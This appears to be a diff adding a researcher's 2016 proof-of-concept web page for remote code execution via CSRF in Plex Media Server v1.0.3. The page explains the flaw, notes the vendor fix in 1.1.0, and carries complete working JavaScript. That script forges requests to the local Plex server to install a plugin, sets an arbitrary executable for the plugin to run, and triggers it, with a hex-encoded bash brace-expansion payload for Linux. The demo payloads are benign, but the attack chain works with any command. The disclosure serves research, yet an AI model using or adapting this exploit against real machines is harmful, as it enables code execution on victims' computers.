@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Plex Media Server v1.0.3 Remote Code Execution via CSRF</title>
+
+    <script src="https://code.jquery.com/jquery-3.0.0.min.js"></script>
+
+    <!-- Ignore this CSS. It's just for readability. -->
+    <style>
+        body {
+            max-width: 40em;
+            margin: auto;
+            padding-bottom: 1em;
+            font-family: sans-serif;
+        }
+
+        h1, p, ul, #logs {
+            margin-left: 1rem;
+            margin-right: 1rem;
+        }
+
+        small, button {
+            font-size: 0.7em;
+        }
+
+        #https-warning {
+            display: none;
+            padding: 0.5rem;
+            background-color: orange;
+            color: white;
+        }
+
+        #fixed-version {
+            padding: 0.5rem;
+            margin: 1.5rem 1rem;
+            background-color: lightgreen;
+        }
+
+        #logs {
+            border: 1px solid black;
+            padding: 0.5em;
+            background-color: #eee;
+            font-family: monospace;
+        }
+
+        @keyframes ellipsis {
+            0% { content: "."; }
+            33% { content: ".."; }
+            66% { content: "..."; }
+        }
+
+        #waiting-animation {
+            display: none;
+        }
+
+        #waiting-animation:after {
+            animation: ellipsis 2s linear infinite;
+            content: ".";
+        }
+    </style>
+</head>
+
+<body>
+    <h1>
+        <a href="https://www.plex.tv/downloads/">Plex Media Server</a> v1.0.3 Remote Code Execution
+        via <abbr title="Cross-site request forgery">CSRF</abbr>
+    </h1>
+
+    <p>
+        <small><a href="mailto:kyle@bearisdriving.com">Kyle Neideck</a>, July 2016</small>
+    </p>
+
+    <p id="https-warning">
+        <!-- ⚠ -->
+        &#9888; It looks like this page is being served over HTTPS. This demo only works when it's
+        served over HTTP because of <a href="https://www.w3.org/TR/mixed-content/#terms">mixed
+        content blocking</a>.
+    </p>
+
+    <p id="fixed-version">
+        Plex fixed this vulnerability shortly after I reported it, in
+        <a href="https://forums.plex.tv/discussion/comment/1237058/#Comment_1237058">version
+        1.1.0</a>. (Thanks, Plex team!)
+    </p>
+
+    <p>
+        I believe this vulnerability had been previously discovered by
+        <a href="https://sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20140411-0_Plex_Media_Server_Multiple_Vulnerabilities_v10.txt">Stefan
+        Viehböck of SEC Consult Vulnerability Lab</a> in v0.9.9.10. They reported it to Plex, but
+        they might not have realised how critical it was, because it wasn't fixed at the time. (Or
+        maybe it couldn't be used for RCE in v0.9.9.10.)
+    </p>
+
+    <p>
+        The <a href="http://127.0.0.1:32400/web">local Plex web UI</a> that Plex Media Server runs
+        is vulnerable to <abbr title="Cross-site request forgery">CSRF</abbr>. This demo uses CSRF
+        on your local Plex web UI to run arbitrary code as the local user. If it works, it'll launch
+        calc.exe or Calculator.app. (Probably several times.)
+    </p>
+
+    <p>
+        When you launch the exploit, this page will
+    </p>
+
+    <ul>
+        <li>install the <a href="https://github.com/pannal/Sub-Zero.bundle">Sub-Zero channel</a> (a
+        subtitles plugin) from the Plex app store,</li>
+        <li>set it to run calc.exe/Calculator.app after it downloads a subtitles file, and</li>
+        <li>refresh your libraries' metadata so it starts downloading subtitles.</li>
+    </ul>
+
+    <p>
+        More specifically, it will forge
+    </p>
+
+    <ul>
+        <li>a GET request to
+        <em>http://127.0.0.1:32400/system/appstore/apps/com.plexapp.agents.subzero/install</em>,</li>
+        <li>a GET request to
+        <em>http://127.0.0.1:32400/video/subzero/:/prefs/set?notify_executable=<strong>[...]</strong>&amp;provider.opensubtitles.use_tags=false&amp;subtitles.scan.embedded=false&amp;subtitles.scan.external=false&amp;subtitles.search.minimumTVScore=21&amp;subtitles.search.minimumMovieScore=21&amp;subtitles.save.metadata_fallback=true&amp;scheduler.max_recent_items_per_library=200</em>
+        where <strong>[...]</strong> is the path to the local executable,</li>
+        <li>PUT requests to a number of URLs starting with
+        <em>http://127.0.0.1:32400/system/agents/</em> (this is a required part of setting up
+        Sub-Zero), and</li>
+        <li>a GET request to the URL
+        <em>http://127.0.0.1:32400/library/sections/<strong>[i]</strong>/refresh?force=1</em>, for
+        each <strong>[i]</strong> from 0 to 9.</li>
+    </ul>
+
+    <p>
+        See the source code of this page for full details.
+    </p>
+
+    <p>
+        Plex runs its plugins in a
+        <a href="https://github.com/zopefoundation/RestrictedPython">RestrictedPython</a> sandbox,
+        but Sub-Zero uses Plex's "elevated" policy, which lets it spawn unsandboxed processes.
+        (Including running outside of the App Sandbox on OS X.)
+    </p>
+
+    <p>
+        I'm pretty sure you need to have at least one movie or TV show in your Plex library. Adding
+        a blank video named "Seinfeld.S01E01.mp4" works.
+    </p>
+
+    <p>
+        If you already have Sub-Zero installed, running this demo will probably mess it up and might
+        not work.
+    </p>
+
+    <p>
+        Tested with:
+    </p>
+
+    <ul>
+        <li>Plex Media Server 1.0.3.2461-35f0caa (Web 2.7.4)</li>
+        <li>Chrome 51, Edge 25</li>
+        <li>Windows 10, Mac OS X 10.11</li>
+    </ul>
+
+    <p>
+        Not tested on Linux or FreeBSD, but it might work anyway. You'll need
+        <a href="https://github.com/vim/vim/blob/master/runtime/doc/xxd.man">xxd</a> and Bash in
+        your PATH. If it does work, it'll write a file to ~/plex_rce_demo_made_this_file instead of
+        opening a calculator app.
+    </p>
+
+    <div id="logs">
+        <div id="log-msgs"></div>
+        <p id="waiting-animation"></p>
+    </div>
+
+    <p>
+        <button id="launch-exploit">Launch Exploit</button>
+        <button id="stop-calculators" disabled="disabled">Stop launching calculators</button>
+        <button id="uninstall-sub-zero" disabled="disabled">Uninstall Sub-Zero channel</button>
+    </p>
+
+    <script>
+        if (typeof $ === 'undefined') {
+            alert('jQuery didn\'t load. You might not be connected to the internet.');
+        }
+
+        let log = function(msg) {
+            console.log(msg);
+            $('#log-msgs').append('<p>' + msg + '</p>');
+        };
+
+        let trigger_subtitle_download = function() {
+            log('Triggering a subtitle download. The easiest way is to refresh every library, so ' +
+                'the calculators might take a minute to start appearing.');
+
+            for (let i = 0; i < 10; i++) {
+                new Image().src = 'http://127.0.0.1:32400/library/sections/' + i +
+                                  '/refresh?force=1';
+            }
+
+            log('Done. If a calculator app doesn\'t open in the next five minutes or so, it ' +
+                'probably didn\'t work. Though it could take longer if you have a lot in your ' +
+                'Plex libraries.');
+
+            $('#waiting-animation').hide();
+            $('#stop-calculators').removeAttr('disabled');
+            $('#uninstall-sub-zero').removeAttr('disabled');
+        };
+
+        let enable_subzero_agents = function() {
+            log('Enabling Sub-Zero metadata agents.');
+
+            let agents = [
+                {
+                    'type': 'movies (Plex Movie)',
+                    'path': 'com.plexapp.agents.imdb/config/1?order=com.plexapp.agents.subzero' +
+                            '%2Ccom.plexapp.agents.localmedia%2Ccom.plexapp.agents.imdb'
+                },
+                {
+                    'type': 'movies (The Movie Database)',
+                    'path': 'com.plexapp.agents.themoviedb/config/1?order=' +
+                            'com.plexapp.agents.subzero%2Ccom.plexapp.agents.localmedia' +
+                            '%2Ccom.plexapp.agents.themoviedb',
+                },
+                {
+                    'type': 'shows (TheTVDB)',
+                    'path': 'com.plexapp.agents.thetvdb/config/2?order=com.plexapp.agents.subzero' +
+                            '%2Ccom.plexapp.agents.localmedia%2Ccom.plexapp.agents.thetvdb' +
+                            '%2Ccom.plexapp.agents.plexthememusic',
+                },
+                {
+                    'type': 'shows (The Movie Database)',
+                    'path': 'com.plexapp.agents.themoviedb/config/2?order=' +
+                            'com.plexapp.agents.subzero%2Ccom.plexapp.agents.themoviedb'
+                }
+            ];
+
+            // Each of these requests sets Sub-Zero as an "additional agent" for one of the built-in
+            // agents. It's a required part of setting up Sub-Zero.
+            //
+            // I had to use Ajax since these are PUT requests, but Plex sends the
+            // "Access-Control-Allow-Origin: *" header and doesn't check for cookies, so it works
+            // fine.
+            //
+            // If Plex didn't enable CORS, I guess I'd have had to try to find an XSS bug. Plex has
+            // a permissive crossdomain.xml, but I don't know if it would help because Flash can't
+            // do PUT requests.
+            let requests = agents.map(agent => {
+                return $.ajax({
+                    url: 'http://127.0.0.1:32400/system/agents/' + agent.path,
+                    method: 'PUT',
+                    beforeSend: function (jqXHR) {
+                        // It seems to fail the preflight request on OS X if this header isn't
+                        // sent in at least one of the PUT requests.
+                        jqXHR.setRequestHeader('X-Plex-Client-Identifier',
+                                               'xxxxxxxxxxxxxxxxxxxxxxxxx');
+                    }
+                }).always((data, textStatus, jqXHR) => {
+                    // Log the success/failure of each request.
+                    if (textStatus === "success" &&  // Workaround jQuery bug #11548
+                        jqXHR.status === 200 &&
+                        jqXHR.responseText.match(
+                            /<agent>com.plexapp.agents.subzero<\/agent>/)) {
+                        log('Enabled Sub-Zero agent for ' + agent.type + '.');
+                    } else {
+                        log('Failed to enable Sub-Zero agent for ' + agent.type +
+                            ' (' + jqXHR.status + '). Continuing anyway.');
+                    }
+                });
+            });
+
+            // Continue after the requests have all finished.
+            $.when.apply($, requests).always(() => {
+                trigger_subtitle_download();
+            });
+        };
+
+        let set_subzero_prefs = function(notify_executable) {
+            log('Setting Sub-Zero to run ' +
+                '<strong class="notify_executable"></strong> ' +
+                'after it finishes downloading a subtitle file.');
+
+            // (In case notify_executable contains HTML chars or something.)
+            $('#logs .notify_executable')
+                .last()
+                .text(notify_executable === '' ? 'nothing' : notify_executable);
+
+            let img = new Image();
+            img.onerror = img.onload = () => {
+                if (notify_executable !== '') {
+                    enable_subzero_agents();
+                }
+            };
+
+            // The important one is notify_executable. The others are just to make more subtitles
+            // download.
+            img.src = 'http://127.0.0.1:32400/video/subzero/:/prefs/set?' +
+                      'notify_executable=' + encodeURIComponent(notify_executable) + '&' +
+                      'provider.opensubtitles.use_tags=false&' +
+                      'subtitles.scan.embedded=false&' +
+                      'subtitles.scan.external=false&' +
+                      'subtitles.search.minimumTVScore=21&' +
+                      'subtitles.search.minimumMovieScore=21&' +
+                      'subtitles.save.metadata_fallback=true&' +
+                      'scheduler.max_recent_items_per_library=200';
+        };
+
+        $('#launch-exploit').click(() => {
+            log('Starting the exploit.');
+
+            $('#waiting-animation').show();
+
+            log('Installing the Sub-Zero channel. Might take a second because Plex has to ' +
+                'download about 11MB.');
+
+            let img = new Image();
+            img.onerror = img.onload = () => {
+                log('Finished installing.');
+
+                if (!window.calculator_cmd) {
+                    log('Couldn\'t detect your OS.');
+
+                    window.calculator_cmd =
+                        prompt('Couldn\'t detect your OS. Enter the path to the executable to try ' +
+                               'to launch. E.g. for Windows:\n\n' +
+                               window.windows_calculator_cmd + '\n\n' +
+                               'or for Mac:\n\n' +
+                               window.osx_calculator_cmd + '\n\n' +
+                               '(It\'ll probably run at least a few times.)',
+                               /* default = */ window.windows_calculator_cmd);
+                }
+
+                if (window.calculator_cmd) {
+                    set_subzero_prefs(calculator_cmd);
+                } else {
+                    log('Exploit cancelled.');
+                }
+            };
+            img.src = 'http://127.0.0.1:32400/system/appstore/apps/com.plexapp.agents.subzero' +
+                      '/install';
+        });
+
+        $('#stop-calculators').click(() => {
+            set_subzero_prefs('');
+        });
+
+        $('#uninstall-sub-zero').click(() => {
+            $('#waiting-animation').show();
+
+            log('Uninstalling the Sub-Zero channel.');
+
+            let img = new Image();
+            img.onerror = img.onload = () => {
+                log('Finished uninstalling.');
+
+                $('#waiting-animation').hide();
+            };
+            img.src = 'http://127.0.0.1:32400/system/appstore/apps/com.plexapp.agents.subzero' +
+                      '/uninstall';
+        });
+
+        let init_page = function() {
+            // Show a warning if the page is being served over HTTPS.
+            if (window.location.protocol == "https:") {
+                $('#https-warning').show();
+            }
+
+            // Set the path to a calculator executable, depending on the victim's OS. (Done early so it
+            // can change the launch button's label as well.)
+            window.windows_calculator_cmd = 'C:\\Windows\\System32\\calc.exe';
+            window.osx_calculator_cmd = '/usr/bin/open /Applications/Calculator.app';
+
+            // On Linux and BSD we just write a file to ~.
+            //
+            // Arguments in the command can't contain spaces, so the payload's decoded from hex.
+            // (Sub-Zero uses .split to turn the command into a list that it can pass to
+            // subprocess.check_output.) Pipe it to "xxd -r -p" if you want to check that it's safe.
+            //
+            // The idea to use brace expansion is from
+            // https://jon.oberheide.org/blog/2008/09/04/bash-brace-expansion-cleverness/
+            let linux_or_bsd_calculator_cmd =
+                '/usr/bin/env bash -c {echo,' +
+                // The payload. Generated by:
+                //   echo 'echo "Looks like it worked." > ~/plex_rce_demo_made_this_file' | xxd -p
+                '6563686f20224c6f6f6b73206c696b6520697420776f726b65642e22203e207e2f706c65785f72' +
+                '63655f64656d6f5f6d6164655f746869735f66696c650a' +
+                // Convert the payload back to text and run it.
+                '}|{xxd,-r,-p}|sh';
+
+            // Default to Windows on error.
+            window.calculator_cmd = window.windows_calculator_cmd;
+
+            let os = navigator.platform;
+
+            if (os.match(/^Win/i)) {  // Windows
+                window.calculator_cmd = window.windows_calculator_cmd;
+
+                // Make the launch button's label more specific.
+                $('#launch-exploit').text("Launch calc.exe");
+            } else if (os.match(/^Mac/i)) {  // OS X
+                window.calculator_cmd = window.osx_calculator_cmd;
+
+                // Make the launch button's label more specific.
+                $('#launch-exploit').text("Launch Calculator.app");
+            } else if (os.match(/^(Linux|[A-Za-z]*BSD($|[^A-Z]))/)) {  // Linux or BSD
+                window.calculator_cmd = linux_or_bsd_calculator_cmd;
+            } else {
+                window.calculator_cmd = null;
+            }
+        };
+
+        init_page();
+    </script>
+</body>
+</html>
+
